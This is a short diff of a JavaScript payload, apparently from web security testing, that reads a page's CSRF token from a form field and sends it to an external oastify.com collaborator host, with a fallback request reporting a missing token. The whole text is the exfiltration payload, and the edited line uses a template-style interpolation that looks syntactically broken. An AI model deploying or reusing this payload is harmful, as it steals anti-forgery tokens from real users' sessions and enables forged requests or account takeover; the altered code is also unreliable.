@@ -8,7 +8,7 @@
       setTimeout(() => {
         try {
           const token = document.querySelector('[name="csrfToken"]').value;
-          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token=" + token);
+          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token="+${csrfToken});
         } catch (e) {
           fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?error=no-token");
         }
